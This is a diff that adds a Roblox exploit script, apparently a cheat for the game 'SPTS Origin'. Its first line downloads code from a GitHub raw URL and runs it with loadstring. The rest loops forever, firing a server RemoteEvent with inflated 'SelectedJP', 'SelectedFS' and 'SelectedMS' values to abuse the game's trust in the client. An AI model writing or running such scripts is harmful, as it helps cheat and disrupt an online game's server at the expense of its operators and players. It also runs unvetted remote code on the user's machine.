@@ -1,0 +1,45 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/WhoIsVoid/ROBLOX-Scripts/main/SPTS-Origin'))()
+
+while task.wait() do
+    local table1 = {
+        "Setting",
+        "SelectedJP",
+        9999999999999
+    }
+
+    local remote = game:GetService("ReplicatedStorage").RemoteEvent
+    remote:FireServer(table1)
+
+    wait(0.2)
+
+    local table1 = {
+        "Setting",
+        "SelectedFS",
+        99999999999999
+    }
+
+    local remote = game:GetService("ReplicatedStorage").RemoteEvent
+    remote:FireServer(table1)
+
+    wait(0.2)
+
+    local table1 = {
+        "Setting",
+        "SelectedFS",
+        99999999999999
+    }
+
+    local remote = game:GetService("ReplicatedStorage").RemoteEvent
+    remote:FireServer(table1)
+
+    wait(0.2)
+
+    local table1 = {
+        "Setting",
+        "SelectedMS",
+        9999999999999
+    }
+
+    local remote = game:GetService("ReplicatedStorage").RemoteEvent
+    remote:FireServer(table1)
+end
